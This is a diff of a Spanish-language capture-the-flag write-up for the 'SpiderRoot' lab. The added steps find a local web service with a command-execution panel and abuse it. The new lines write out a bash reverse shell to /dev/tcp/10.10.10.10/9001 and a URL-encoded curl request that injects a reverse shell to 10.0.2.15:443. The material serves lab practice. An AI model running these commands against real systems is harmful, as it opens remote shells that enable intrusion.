@@ -1,4 +1,4 @@
-<img width="1902" height="677" alt="9" src="https://github.com/user-attachments/assets/9919017a-0530-4fbd-bccd-12ba88a8af64" /><h2>Desplegamos el laboratorio spiderport.tar</h2>
+<h2>Desplegamos el laboratorio spiderport.tar</h2>
 
 <img width="1166" height="858" alt="1" src="../SpiderRoot/images/1.png" />
 
@@ -36,3 +36,19 @@
 
 <h2>Entramos por SSH</h2>
 <img width="1166" height="858" alt="1" src="../SpiderRoot/images/10.png" />
+
+
+<h2>Visualizamos que puertos estan abiertos localmente y encontramos un servicio web en el puerto 8080</h2>
+<img width="1166" height="858" alt="1" src="../SpiderRoot/images/11.png" />
+
+<h2>Hacemos una peticion al servidor web local.</h2>
+<h3>curl -s "http://127.0.0.1:8080"</h3>
+<img width="1166" height="858" alt="1" src="../SpiderRoot/images/13.png" />
+
+<h2>Encontramos un panel de ejecucion de comandos por la cual mandaremos una revere shell a nuestro equipo.</h2>
+<h2 href="https://www.revshells.com/">Aqui puedes generar la reverse shell, RECUERDA PONER EN ENCODING URL DECODER</h2>
+<h2>bash -c "bash -i >& /dev/tcp/10.10.10.10/9001 0>&1"</h2>
+<h3>curl "http://127.0.0.1:8080/?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.2.15%2F443%200%3E%261%22"</h3>
+
+
+
